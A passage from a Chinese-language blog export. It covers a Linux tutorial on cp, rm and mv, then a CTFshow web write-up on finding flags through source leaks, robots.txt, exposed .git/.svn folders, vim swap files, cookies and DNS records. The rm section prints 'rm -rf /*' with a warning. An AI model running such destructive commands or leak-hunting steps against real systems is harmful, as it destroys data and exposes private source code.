+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立源文件</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># touch cangls</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#把源文件不改名复制到 /tmp/ 目录下</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp cangls /tmp/</span></span><br><span class="line"></span><br><span class="line">如果需要改名复制，则命令如下：</span><br><span class="line"></span><br><span class="line"><span class="comment">#改名复制</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp cangls /tmp/bols</span></span><br></pre></td></tr></table></figure>
+
+<p>如果<strong>复制的目标位置已经存在同名的文件，则会提示是否覆盖，因为 cp 命令默认执行的是 “cp -i” 的别名</strong></p>
+<h5 id="【例二】复制目录：cp-r"><a href="#【例二】复制目录：cp-r" class="headerlink" title="【例二】复制目录：cp -r"></a>【例二】复制目录：cp -r</h5><p><strong>复制目录只需使用 “cp -r” 选项即可</strong>，例如：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立测试目录</span></span><br><span class="line"></span><br><span class="line">root@localhost ~]<span class="comment"># mkdir movie</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#目录原名复制</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp -r /root/movie/ /tmp/</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="【例-2】复制软链接文件：cp-d"><a href="#【例-2】复制软链接文件：cp-d" class="headerlink" title="【例 2】复制软链接文件：cp -d"></a>【例 2】复制软链接文件：cp -d</h5><p>如果源文件不是一个普通文件，而是一个软链接文件，那么是否可以复制软链接的属性呢？我们试试：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立一个测试软链接文件/tmp/cangls_slink</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># ln -s /root/cangls /tmp/cangls_slink</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源文件本身就是一个软链接文件</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># ll /tmp/cangls_slink</span></span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root <span class="number">12</span> <span class="number">6</span> 月 <span class="number">14</span> <span class="number">05</span>:<span class="number">53</span> /tmp/cangls_slink -&gt; /root/cangls</span><br><span class="line"></span><br><span class="line"><span class="comment">#复制软链接文件，但是不加&quot;-d&quot;选项</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp /tmp/cangls_slink /tmp/cangls_t1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#复制软链接文件，加入&quot;-d&quot;选项</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp -d /tmp/cangls_slink /tmp/cangls_t2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#会发现不加&quot;-d&quot;选项，实际复制的是软链接的源文件，而不是软链接文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#而如果加入了&quot;-d&quot;选项，则会复制软链接文件</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># ll /tmp/cangls_t1 /tmp/cangls_t2</span></span><br><span class="line"><span class="literal">-rw-r--r--</span> <span class="number">1</span> root root <span class="number">0</span> <span class="number">6</span>月 <span class="number">14</span> <span class="number">05</span>:<span class="number">56</span> /tmp/cangls_t1</span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root <span class="number">12</span> <span class="number">6</span> 月 <span class="number">14</span> <span class="number">05</span>:<span class="number">56</span>/tmp/ cangls_t2-&gt; /root/cangls</span><br></pre></td></tr></table></figure>
+
+<p>说明，如果在复制软链接文件时不使用 “-d” 选项，则 cp 命令复制的是源文件，而不是软链接文件；只有加入了 “-d” 选项，才会复制软链接文件。<br>注意，“-d” 选项对硬链接是无效的。</p>
+<h5 id="【例-3】保留源文件属性复制：cp-p"><a href="#【例-3】保留源文件属性复制：cp-p" class="headerlink" title="【例 3】保留源文件属性复制：cp -p"></a>【例 3】保留源文件属性复制：cp -p</h5><p>我们发现，在执行复制命令后，目标文件的时间会变成复制命令的执行时间，而不是源文件的时间。例如：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp /var/lib/mlocate/mlocate.db /tmp/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意源文件的时间和所属组</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># ll /var/lib/mlocate/mlocate.db</span></span><br><span class="line"><span class="literal">-rw-r-----1</span> root slocate2328027 <span class="number">6</span>月 <span class="number">14</span> <span class="number">02</span>:<span class="number">08</span>/var/lib/mlocate/mlocate.db</span><br><span class="line"></span><br><span class="line"><span class="comment">#由于复制命令由root用户执行，所以目标文件的所属组为了root，而且时间也变成了复制命令的执行时间</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment">#ll /tmp/mlocate.db</span></span><br><span class="line"><span class="literal">-rw-r-----</span> <span class="number">1</span> root root2328027 <span class="number">6</span> 月 <span class="number">14</span> <span class="number">06</span>:<span class="number">05</span>/tmp/mlocate.db</span><br></pre></td></tr></table></figure>
+
+<p>当我们执行备份、曰志备份的时候，这些文件的时间可能是一个重要的参数，这就需执行 <strong>“cp -p” 选项</strong>了。这个选项<strong>会保留源文件的属性，包括所有者、所属组和时间</strong>。例如：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用&quot;-p&quot;选项</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp -p /var/lib/mlocate/mlocate.db /tmp/mlocate.db_2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源文件和目标文件的所有属性都一致，包括时间</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># ll /var/lib/mlocate/mlocate.db /tmp/mlocate.db_2</span></span><br><span class="line"><span class="literal">-rw-r-----</span> root slocate <span class="number">2328027</span> <span class="number">6</span>月 <span class="number">14</span> <span class="number">02</span>:<span class="number">08</span> /tmp/mlocate.db_2</span><br><span class="line"><span class="literal">-rw-r-----</span> root slocate <span class="number">2328027</span> <span class="number">6</span>月 <span class="number">14</span> <span class="number">02</span>:<span class="number">08</span> /var/lib/mlocate/mlocate.db</span><br></pre></td></tr></table></figure>
+
+<p><strong>“-a” 选项相当于 “-d、-p、-r” 选项</strong>，这几个选项我们已经分别讲过了。<br>所以，<strong>当我们使用 “-a” 选项时，目标文件和源文件的所有属性都一致，包括源文件的所有者，所属组、时间和软链接性</strong>。使用 “-a” 选项来取代 “-d、-p、-r” 选项更加方便。</p>
+<h5 id="【例-4】-“-l”-和-“-s”-选项"><a href="#【例-4】-“-l”-和-“-s”-选项" class="headerlink" title="【例 4】 “-l” 和 “-s” 选项"></a>【例 4】 “-l” 和 “-s” 选项</h5><p><strong>我们如果使用 “-l” 选项，则目标文件会被建立为源文件的硬链接；而如果使用了 “-s” 选项，则目标文件会被建立为源文件的软链接</strong>。</p>
+<p>这两个选项和 “-d” 选项是不同的，“d” 选项要求源文件必须是软链接，目标文件才会复制为软链接；而 <strong>“-l” 和 “-s” 选项的源文件只需是普通文件，目标文件就可以直接复制为硬链接和软链接</strong>。<br>例如：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立测试文件</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># touch bols</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源文件只是一个普通文件，而不是软链接文件</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># ll -i bols</span></span><br><span class="line"><span class="number">262154</span><span class="literal">-rw-r--r--</span> <span class="number">1</span> root root <span class="number">0</span> <span class="number">6</span>月 <span class="number">14</span> <span class="number">06</span>:<span class="number">26</span> bols</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用&quot;-l&quot; 和&quot;-s&quot;选项复制</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp -l /root/bols /tmp/bols_h</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp -s /root/bols /tmp/bols_s</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># ll -i /tmp/bols_h /tmp/bols_s</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#目标文件 /tmp/bols_h 为源文件的 硬链接 文件（cp -l）</span></span><br><span class="line"></span><br><span class="line"><span class="number">262154</span><span class="literal">-rw-r--r--</span> <span class="number">2</span>root root <span class="number">0</span> <span class="number">6</span> 月 <span class="number">14</span> <span class="number">06</span>:<span class="number">26</span>/tmp/bols_h</span><br><span class="line"></span><br><span class="line"><span class="comment">#目标文件 /tmp/bols_s 为源文件的 软链接 文件（cp -s）</span></span><br><span class="line"></span><br><span class="line"><span class="number">932113</span> lrwxrwxrwx <span class="number">1</span> root root <span class="number">10</span> <span class="number">6</span> 月 <span class="number">14</span> <span class="number">06</span>:<span class="number">27</span>/tmp/bols_s -&gt; /root/bols</span><br></pre></td></tr></table></figure>
+
+<h2 id="8-rm-remove"><a href="#8-rm-remove" class="headerlink" title="8.rm(remove)"></a>8.rm(remove)</h2><p><a href="https://so.csdn.net/so/search?q=rm%E5%91%BD%E4%BB%A4&spm=1001.2101.3001.7020">rm命令</a>是英文单词remove的缩写，主要功能是删除文件或目录</p>
+<p>rm命令的语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm [选项] 文件名</span><br></pre></td></tr></table></figure>
+
+<p>常用选项如下：</p>
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用或含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-f</td>
+<td>强制删除，且不提示确认</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>每次删除前会询问用户是否确定删除，默认选项</td>
+</tr>
+<tr>
+<td>-r或者-R</td>
+<td>递归删除目录及其内容</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>显示指令的详细执行过程</td>
+</tr>
+<tr>
+<td>-d</td>
+<td>删除空目录</td>
+</tr>
+</tbody></table>
+<p>实例演示</p>
+<p>1、不带选项删除某个文件，默认会进行二次确认，敲击y进行确认。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不带选项删除文件会提示确认</span></span><br><span class="line">[root@myEuler ~]<span class="comment"># rm file1 </span></span><br><span class="line"><span class="built_in">rm</span>：是否删除普通文件 <span class="string">&#x27;file1&#x27;</span>？y</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 选项-i的为默认选项，效果与无选项相同</span></span><br><span class="line">[root@myEuler ~]<span class="comment"># rm -i file1 </span></span><br><span class="line"><span class="built_in">rm</span>：是否删除普通文件 <span class="string">&#x27;file1&#x27;</span>？y</span><br></pre></td></tr></table></figure>
+
+<p>2、强行删除普通文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用选项-f删除普通文件时，不会提示确认</span></span><br><span class="line">[root@myEuler ~]<span class="comment"># rm -f file1 </span></span><br></pre></td></tr></table></figure>
+
+<p>3、删除目录</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#注意目录文件与普通文件的区别，删除目录必须带选项-r，否则将会报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#目录文件不能直接删除</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">myEuler</span> ~]<span class="comment"># rm dir_file</span></span><br><span class="line"><span class="built_in">rm</span>: 无法删除 <span class="string">&#x27;dir_file&#x27;</span>: Is a directory</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除目录文件必须使用选项-r</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">myEuler</span> ~]<span class="comment"># rm -r dir_file</span></span><br><span class="line"><span class="built_in">rm</span>：是否删除目录 <span class="string">&#x27;dir_file&#x27;</span>？y</span><br><span class="line"></span><br><span class="line"><span class="comment">#联合使用-rf选项，可以强行删除目录，包括其中的内容</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">myEuler</span> ~]<span class="comment"># rm -rf dir_file</span></span><br></pre></td></tr></table></figure>
+
+<p>4、删除多个文件</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可以将多个文件全部列出来，也可以使用通配符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除当前目录下的file3和file4文件</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">myEuler</span> ~]<span class="comment"># rm -f file3 file4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除当前目录下的所有以file开头的普通文件</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">myEuler</span> ~]<span class="comment"># rm -f file*</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除当前目录下的所有扩展名为.txt的普通文件</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">myEuler</span> ~]<span class="comment"># rm -f *.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>5、强制清空服务器系统内的所有文件（谨慎操作！！！）</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#该操作看看就好，切忌执行，否则系统将可能报废</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">myEuler</span> ~]<span class="comment"># rm -rf /*</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="9-mv-move-file"><a href="#9-mv-move-file" class="headerlink" title="9.mv(move file)"></a>9.mv(move file)</h2><p>mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename) files）。</p>
+<h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv [选项] 源文件或目录 目标文件或目录</span><br></pre></td></tr></table></figure>
+
+<p>1.当mv命令中的第二个参数类型（目标）是文件时，实现<strong>重命名</strong>源文件或目录的功能，记住这里源文件或目录只能有一个，因为如果有多个时，会存在命名冲突的问题 。</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/20190527221109516.png" alt="20190527221109516"></p>
+<p>2.当mv命令中的第二个参数类型（目标）是目录时，实现的是<strong>移动</strong>源文件和目录的功能,这里源文件或目录可以有多个，mv命令会将源文件或目录移动到目标目录下。</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/20190527221619856.png" alt="20190527221619856"></p>
+<p>3.mv -b:当覆盖文件之前先行备份。</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/20190527222544485.png" alt="20190527222544485"></p>
+<p>4.mv -f(force强制):当覆盖文件时，不询问直接覆盖：</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/20190527223047864.png" alt="20190527223047864"></p>
+<p>5.mv -i :当覆盖文件之前，会询问是否覆盖：</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/20190527223047864.png" alt="20190527223047864"></p>
+<p>6.mv -u :只有当源文件是最新更新时，才可以覆盖目标文件</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/20190527224720538.png" alt="20190527224720538">[7.mv -t:当需</p>
+<p>7.mv -t:当需要移动多个源文件时，适用于这种方式，这时目标目录在前，源文件在后</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/20190527225525278.png" alt="20190527225525278"></p>
+]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/10/20/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>ctfshow中web题的一些解题记录与知识汇集…</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231027002039592.png" alt="image-20231027002039592"></p>
+<span id="more"></span>
+
+<h1 id="ctfshow-Web刷题记录"><a href="#ctfshow-Web刷题记录" class="headerlink" title="ctfshow  Web刷题记录"></a>ctfshow  Web刷题记录</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>本题说是ctf最基础的知识来解题，于是想到flag藏到网页的源代码中，于是右键查看源代码，果然找到了flag<img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231019225944644.png" alt="image-20231019225944644"></p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>打开题目发现网页显示“无法查看源代码”</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231019230814728.png" alt="image-20231019230814728"></p>
+<p>果然，通过平常的右键查看与按F12查看源码方法都不生效了，于是再介绍两个查看源码的方法：</p>
+<p>1：在url前面加上**view-source:**即可以查看源码</p>
+<p>2：直接<strong>ctrl+u</strong>就可以看到源码</p>
+<p>最后在源码中成功找到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231019231236441.png" alt="image-20231019231236441"></p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>打开题目，发现一个where is flag的标识</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231019231739814.png" alt="image-20231019231739814"></p>
+<p>尝试着打开源码，但是发现源码没有一点信息，于是试着用brupsuite抓包一下，将抓到的内容发送到重发器上，并且在重发器上看一下相应，成功在相应中得到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202023-10-19%2520232119.png" alt="屏幕截图 2023-10-19 232119"></p>
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>打开题目发现他给出了提示“总有人把后台写入robots…”,猜到是关于robots.txt的信息泄露</p>
+<p>这里介绍一下robots协议：</p>
+<p>Robots协议（也称为**<a href="https://so.csdn.net/so/search?q=%E7%88%AC%E8%99%AB&spm=1001.2101.3001.7020">爬虫</a>协议**、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p>
+<p>robots是一个协议，而不是一个命令。robots.txt文件是一个文本文件，是放置在网站根目录下，使用任何一个常见的文本编辑器，就可以创建和 编辑它。<strong>robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，其主要的作用就是告诉蜘蛛程序在服务器上什么文件是可以被查看的</strong>。</p>
+<p>如果将网站视为一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎进入”的提示牌。<strong>这个文件告诉来访的搜索引擎哪些房间可以进 入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。</strong>但robots.txt不是命令，也不是防火墙，如同守门人无法阻 止窃贼等恶意闯入者。</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231019233418329.png" alt="image-20231019233418329"></p>
+<p>于是在网址后面加上**&#x2F;robots.txt**来查看网站下的robots.txt文件，找到disallow路径</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231019234711812.png" alt="image-20231019234711812"></p>
+<p>继续访问这个文件，在网址后面加上&#x2F;flagishere.txt</p>
+<p>最终得到flag</p>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>打开题目发现有提示说“phps源码泄露有时候能帮上忙”，于是想到本题可能与php源码泄露有关</p>
+<p>于是在网址后面加上**&#x2F;index.phps**进行关于php源码泄露的查看，输入便看到有文件生成</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231020000628921.png" alt="image-20231020000628921"></p>
+<p>打开文件，于是在其中得到flag</p>
+<h2 id="web5-1"><a href="#web5-1" class="headerlink" title="web5"></a>web5</h2><p>打开题目发现有提示“解压源码到当前目录，测试正常，收工”，猜测可能是目录的网站源码泄露</p>
+<p>于是使用dirsearch扫描一下，发现显示&#x2F;<a href="http://www.zip下显示是200,代表着可以正常访问/">www.zip下显示是200，代表着可以正常访问</a></p>
+<p>在此附注一下dirsearch的扫描方法：在下载了dirsearch的根目录下打开终端，输入命令：python dirsearch.py -u <a href="http://xxxx/">http://xxxx</a>成功使用dirsearch进行扫描</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231020001441915.png" alt="image-20231020001441915"></p>
+<p>于是在网址下加上&#x2F;<a href="http://www.zip后缀,于是成功得到文件www.zip/">www.zip后缀，于是成功得到文件www.zip</a></p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231020002142068.png" alt="image-20231020002142068"></p>
+<p>打开解压文件，发现有个txt文件，打开发现有一行“flag{flag_here}”，并没有真正的flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231020003132673.png" alt="image-20231020003132673"></p>
+<p>于是试着将这个文件的名字加到网址后面。即加上**&#x2F;fl000g.txt**，加上后回车便得到本题的flag</p>
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>打开题目，发现给出提示“版本控制很重要，但不要部署到生产环境更重要。”</p>
+<p>起初还不知道是什么意思，于是先用dirsearch扫描一下，结果扫出来存在隐藏文件&#x2F;.git&#x2F;，加上此后缀可以正常访问网站</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231020003812706.png" alt="image-20231020003812706"></p>
+<p>于是在网址后加上&#x2F;.git&#x2F;，成功获得flag,解出本题</p>
+<p>在解出本题之后，才知道是关于git泄露的问题，在此搜索了一点关于git信息泄露的知识进行补充：</p>
+<p>Git是一个开源的分布式版本控制系统 ,我们简单的理解为Git 是一个内容寻址文件系统，也就是说Git 的核心部分是键值对数据库。 <strong>当我们向 Git 仓库中插入任意类型的内容(开发者们在其中做的版本信息修改之类的操作)，它会返回一个唯一的键，通过该键可以在任意时刻再次取回该内容</strong></p>
+<p>Git是一个可以实现有效控制应用版本的系统，但是在一旦在代码发布的时候，存在不规范的操作及配置，就很可能将源代码泄露出去。那么，一旦攻击者或者黑客发现这个问题之后，就可能利用其获取网站的源码、数据库等重要资源信息，进而造成严重的危害。</p>
+<p>漏洞危害：<strong>在配置不当的情况下，可能会将“.git”文件直接部署到线上环境，这就造成了git泄露问题</strong>。</p>
+<p>攻击者利用该漏洞下载.git文件夹中的所有内容。如果文件夹中存在敏感信息(数据库账号密码、源码等)，通过白盒的审计等方式就可能直接获得控制服务器的权限和机会！</p>
+<p>在此附上找到相关资料的大神的文章<a href="https://blog.csdn.net/wulanlin/article/details/122409259?ops_request_misc=%7B%22request_id%22:%22169773360416800180678025%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169773360416800180678025&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122409259-null-null.142%5Ev96%5Epc_search_result_base7&utm_term=.git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2&spm=1018.2226.3001.4187">Git信息泄露原理解析及利用总结_git泄露-CSDN博客</a></p>
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>打开题目发现给出提示“版本控制很重要，但不要部署到生产环境更重要”</p>
+<p>于是猜到flag是藏在网址目录下</p>
+<p>于是尝试用dirsearch扫描一下</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-23%20233021.png" alt="屏幕截图 2023-10-23 233021"></p>
+<p>于是在url后面加上&#x2F;.svn&#x2F;的后缀，最后成功得到flag</p>
+<p>在写完题目后，浅显的查找了一些关于svn的知识</p>
+<ul>
+<li><p>SVN是subversion的缩写，是一个开放源代码的版本控制系统，通过采用分支管理系统的高效管理，简而言之就是用于多个人共同开发同一个项目，实现共享资源，实现最终集中式的管理。</p>
+</li>
+<li><p>造成SVN源代码漏洞的主要原因是管理员操作不规范。<strong>在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，包含重要的源代码信息</strong>,开发管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，导致.svn隐藏文件夹被暴露于外网环境</p>
+</li>
+</ul>
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>打开题目，发现提示是“发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了”</p>
+<p>猜测这个提示描述的应该是在使用vim修改文件的时候，没有正常退出，于是导致vim缓存信息泄露，并且生成了<strong>index.php.swp文件</strong></p>
+<p>于是url后加上&#x2F;index.php.swp，访问后发现生成了文件</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231024001833770.png" alt="image-20231024001833770"></p>
+<p>打开发现flag</p>
+<h4 id="添加知识"><a href="#添加知识" class="headerlink" title="添加知识"></a>添加知识</h4><ul>
+<li>使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除。vim异常退出后，因为未处理缓存文件不会被删除，可以通过缓存文件恢复原始文件内容以 index.php 为例：<br>第一次vim会创建缓存的交换文件名为 <strong>.index.php.swp</strong>，<br>再次意外退出后，将会产生名为 <strong>.index.php.swo</strong> 的交换文件，<br>第三次产生的交换文件则为 <strong>.index.php.swn</strong>。</li>
+</ul>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>打开题目提示“cookie 只是一块饼干，不能存放任何隐私数据”</p>
+<p>说明该题是关于cookie的知识点，于是使用bp抓包获取cookie信息</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231024002632812.png" alt="image-20231024002632812"></p>
+<p>抓包后直接得到了flag</p>
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>打开题目，题目给出的提示是“域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息”</p>
+<p>于是尝试着在网页打开这个域名，但是失败了，无法打开</p>
+<p>最后还是没有思路，于是看了看别人的wp，发现了<strong>nslookup</strong>这个命令</p>
+<p>于是在kali上输入命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup -query=any flag.ctfshow.com</span><br></pre></td></tr></table></figure>
+
+<p>在kali中得到flag</p>
+<p>在这里，查找了一些关于<strong>nslookup</strong>有关的知识</p>
+<ul>
+<li><p>nslookup 命令，是Linux里非常常用的网络命令，简而言之就是“查DNS信息用的”。</p>
+<p>nslookup 用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题</p>
+</li>
+<li><p>他有两种工作模式，即“<strong>交互模式</strong>”和“<strong>非交互模式</strong>”。</p>
+<p>交互模式：允许用户查询域名服务器，以获取有关主机和域名的信息，或是打印域名中的主机列表。</p>
+<p>在以下情况下进入交互模式：</p>
+<p>没有给出参数（将使用默认名称服务器），<strong>即直接输入nslookup命令</strong>，不加任何参数，此时<strong>nslookup会连接到默认的域名服务器</strong>（即&#x2F;etc&#x2F;resolv.conf的第一个dns地址）。</p>
+<p>第一个参数是连字符 (-) 并且第二个参数是域名服务器的主机名或 IP 地址。</p>
+<p>非交互模式：<strong>允许用户获取指定主机或域名的名称或所需信息。</strong></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">本题就是进入到非交互模式实现获取域名的相关信息</span><br></pre></td></tr></table></figure>
+
+<p>当要查找的主机的名称或 IP 地址作为第一个参数给出时，进入非交互模式。即直接在nslookup命令后加上所要查询的IP或主机名。</p>
+<p>nslookup不仅支持设置参数，也是支持设置选项（options）的，比如<strong>可以使用-query来设置查询类型为主机信息</strong></p>
+<h4 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nslookup [-<span class="type">option</span>] [<span class="type">name</span> | -] [<span class="type">server</span>]</span><br></pre></td></tr></table></figure>
+
+<h4 id="选项说明"><a href="#选项说明" class="headerlink" title="选项说明"></a>选项说明</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="literal">-query</span>=<span class="built_in">TYPE</span></span><br><span class="line">	设置查询的类型。等同交互命令 <span class="built_in">set</span> <span class="built_in">type</span>=VALUE。VALUE 取值见下文。</span><br><span class="line"><span class="literal">-timeout</span>=NUMBER</span><br><span class="line">	设置等待响应的超时时间，单位秒。等同交互命令 <span class="built_in">set</span> timeout=NUMBER。</span><br><span class="line"><span class="literal">-debug</span></span><br><span class="line">	显示更详细的信息。</span><br></pre></td></tr></table></figure>
+
+<h4 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a>常用示例</h4><p>（1）在非交互模式下正向解析，查询域名信息</p>
